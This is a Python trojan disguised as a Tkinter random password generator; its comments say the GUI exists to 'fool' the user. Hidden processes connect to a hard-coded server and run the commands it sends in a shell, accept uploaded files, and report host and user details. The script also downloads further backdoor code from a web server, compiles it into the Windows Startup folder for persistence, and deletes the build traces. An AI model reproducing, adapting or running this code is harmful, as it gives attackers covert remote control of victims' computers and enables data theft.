# --------- Modules for GUI -------
import tkinter as tk
import random
import pyautogui
# ------- Modules for connecting to server adn executing commands -------
import socket
import subprocess
import multiprocessing
import os
import platform
import getpass
import requests

# ------CONSTANTS-------
HEADERSIZE = 10

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def recv_commands():
    """
    This function receives commands from the server and executes them
    :return: None
    """
    while True:
        try:
            '''Change the IP address to your public IP address'''
            s.connect(("192.168.0.105", 42424))  # Connect to the server
        except socket.error:
            continue
        else:
            break
    while True:
        full_msg = ''
        new_msg = True
        while True:
            try:
                msg = s.recv(16)
            except ConnectionResetError:
                commands_process.close()
                return
            if new_msg:
                '''Check if this is a new message, if it its , we will get the message header first'''
                msglength = msg[:HEADERSIZE].decode("utf-8")
                try:
                    msglen = int(msglength)
                except ValueError:
                    continue
                new_msg = False

            full_msg += msg.decode("utf-8")

            if len(full_msg)-HEADERSIZE == msglen:
                full_msg = full_msg[HEADERSIZE:]
                if full_msg == "check alive test":
                    s.send(bytes("he", "utf-8"))
                    full_msg = ""
                    new_msg = True
                    continue
                if "cd" in full_msg:
                    try:
                        os.chdir(full_msg[3:])
                    except:
                        pass
                if len(full_msg) > 0:
                    if "efile" in full_msg[:8]:
                        full_msg = full_msg[7:]
                        name_index = full_msg.index("endname")
                        name = full_msg[:name_index - 1]
                        full_msg = full_msg[name_index + 8:]
                        name_counter = 0
                        base_name = name
                        while True:
                            try:
                                file = open(name, "x")
                            except FileExistsError:
                                name_counter += 1
                                temp_name = os.path.splitext(base_name)
                                temp_name = list(temp_name)
                                temp_name[0] = temp_name[0] + str(name_counter)
                                name = temp_name[0] + temp_name[1]
                            else:
                                break
                        file.write(full_msg)
                        file.close()
                        msg = f"file \"{name}\" saved in {os.getcwd()}"
                        msg = f"{len(msg):<{HEADERSIZE}}" + msg
                        s.send(bytes(msg, "utf-8"))
                        new_msg = True
                        full_msg = ""
                        continue
                    if "getos" in full_msg:
                        output_bytes = bytes(str(platform.system() + "\n"), "utf-8")
                    elif "info" in full_msg and platform.system() == "Windows":
                        sysinfo = f"""
                                       Operating System: {platform.system()}
                                       Computer Name: {platform.node()}
                                       Username: {getpass.getuser()}
                                       Release Version: {platform.release()}
                                       Processor Architecture: {platform.processor()}
                                                   \n"""
                        output_bytes = bytes(str(sysinfo), "utf-8")
                    elif "information" in full_msg and platform.system() != "Windows":
                        sysinfo = f"""
                                                           Operating System: {platform.system()}
                                                           Computer Name: {platform.node()}
                                                           Username: {getpass.getuser()}
                                                           Release Version: {platform.release()}
                                                           Processor Architecture: {platform.processor()}
                                                                       \n"""
                        output_bytes = bytes(str(sysinfo), "utf-8")
                    else:
                        cmd = subprocess.Popen(full_msg[:], shell=True, stdout=subprocess.PIPE,
                                               stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_bytes, "utf-8")
                    output_str = output_str + str(os.getcwd()) + '> '
                    output_str = f"{len(output_str):<{HEADERSIZE}}" + output_str
                    s.send(str.encode(output_str, "utf-8"))
                full_msg = ""
                new_msg = True

# create backdoor that will able to connect to server all the time the machine is on and connected to the internet
def create_backdoor(request):
    code = request.text
    temp_file = open("temp.py", "w")
    temp_file.write(code)
    temp_file.close()
    global name
    name = "backdoor"  # Here you can change the name of the backdoor app
    if platform.system() == "Windows":
        global location
        global startup_location
        location = "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.exe".format(str(getpass.getuser()))
        startup_location = "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(str(getpass.getuser()))
        win_cmd = subprocess.Popen("pip install pyinstaller", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        res_win = win_cmd.stderr.read()
        mac_linux_cmd = subprocess.Popen("pip3 install pyinstaller", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        res_mac_linux = mac_linux_cmd.stderr.read()
        if res_win != b"" and res_mac_linux != b"":
            backdoor_process.daemon = True
            return
        command = "pyinstaller -w --onefile --distpath \"{}\" --clean --workpath .\.build --name {} temp.py ".format(startup_location, name)
        exe_subp = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result = str(exe_subp.stdout.read() + exe_subp.stderr.read(), "utf-8")
        if "INFO: Building EXE from EXE-00.toc completed successfully." not in result:  # checks if the exe created successfully
            print(result)
            print("Error while creating exe")  # Remove that when you give the program to the user
        else:
            print("Exe create successfully")
        clear()  # calls to clear all unnecessary files
        backdoor_process.daemon = True

        
# Delete all files the backdoor creation created
def clear():
    """
    This functions deletes all unnecessary files from the backdoor creation
    :return: None
    """
    commands = ["del /f/s/q {} > nul".format(location), "rmdir {}".format(location), "del /f/s/q __pycache__ > nul",
                "rmdir __pycache__", "del /f/s/q .build > nul", "rmdir .\\.build\\{}".format(name), "rmdir .build",
                "del {}.spec".format(name), "del temp.py"]
    for command in commands:
        subp = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# -------GUI APP--------
''' Here you can put any GUI app that you want that will "fool" the user'''
chars = ['\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'q', 'w', 'e', 'r', 't',
         'y', 'u', 'i', 'o', 'p', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', 'A', 'S', 'D', 'S', 'F', 'G', 'H', 'J', 'K', 'L',
         'Q',
         'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '!', '@', '#',
         '$',
         '%', '&', '*', '(', ')', '-', '_', '=', '+', ';']


# This function creates a random password using the chars above in the length that user wants
def gen_password():
    try:
        length = int(len_entry.get())
    except ValueError:
        pyautogui.alert(text="Please enter a whole number")
        return 0
    password = ""
    for char in range(length):
        password += chars[random.randint(0, len(chars) - 1)]
    genpass_display_text_field.delete("1.0", "end")
    genpass_display_text_field.insert("1.0", password)


# This function the last generated password to a file named "Passwords.txt"
def savepassword():
    while True:
        try:
            with open("Passwords.txt", "r+") as textg:
                a = textg.read()
                if a == "":
                    with open("Passwords.txt", "w+") as textf:
                        password_to_save = genpass_display_text_field.get("1.0", "end")
                        textf.write(password_to_save)
                        pyautogui.alert(text="Password Saved! see it at Passwords.txt")
                        textf.close()
                        break
                else:
                    with open("Passwords.txt", "a+") as textf:
                        password_to_save = genpass_display_text_field.get("1.0", "end")
                        textf.write(password_to_save)
                        pyautogui.alert(text="Password Saved! see it at Passwords.txt")
                        textf.close()
                        break
            # with open("Passwords.txt", "ar" ) as textf:
            # password_to_save = genpass_display_text_field.get("1.0", "end")
            # textf.write("\n" + password_to_save)
            # pyautogui.alert(text="Password Saved! see it at Passwords.txt")
        except FileNotFoundError:
            cr = open("Passwords.txt", "x")


win = tk.Tk()  # Create a window instance
win.geometry("800x800")  # Set the window size to 800x800
win.title("Random Password Generator")  # Set the title of the window to "Random Password Generator"
# ------ Labels -----------
len_label = tk.Label(text="Enter the number of characters that you want your password to contain",
                     font=("Roboto Light", 16))
len_label.place(x=0, y=0)
genpass_label = tk.Label(text='Generated Password: ', font=("Roboto Light", 16))
genpass_label.place(x=2, y=44)
# -------- Entry ---------
len_entry = tk.Entry(width=28)
len_entry.place(x=4, y=28)
# ------- Text field --------
genpass_display_text_field = tk.Text(width=40, height=18, font=("Roboto Light", 14))
genpass_display_text_field.place(x=2, y=74)
# --------- Butttons ---------
gen_button = tk.Button(text="Generate Password", font=("Roboto Light", 12), width=16, height=4, command=gen_password)
gen_button.place(x=560, y=100)
save_button = tk.Button(text="Save Password", font=("Roboto Light", 12), width=16, height=4, command=savepassword)
save_button.place(x=560, y=200)

# ------- END OF GUI APP --------

# Get the code of the backdoor
debug = True  # Change to False when you give the file to the client
try:
    request = requests.get("http://webserver.com/backdoor.py")
except Exception:
    if not debug:  # if this is real client use and not in development
        print("Cannot get files from web server!")
        print("Quiting...")
        quit()

# Creating processes to receive commands from the server and create a backdoor
commands_process = multiprocessing.Process(target=recv_commands)  # Creating a process to connect to server and execute commands
commands_process.daemon = True
backdoor_process = multiprocessing.Process(target=create_backdoor, args=(request, ))
backdoor_process.daemon = False
if __name__ == "__main__":
    try:
        commands_process.start()  # connect to the server and start executing commands
        backdoor_process.start()  # create the backdoor
        win.mainloop()
    except KeyboardInterrupt:
        try:
            commands_process.kill()
        except Exception:
            pass
    try:
        if platform.system() == "Windows":
            #os.system("\"{}\\{}.exe\"".format(startup_location, name))
            pass
        else:
            pass  # add here initialization of the backdoor on linux and mac
    except Exception as e:
        pass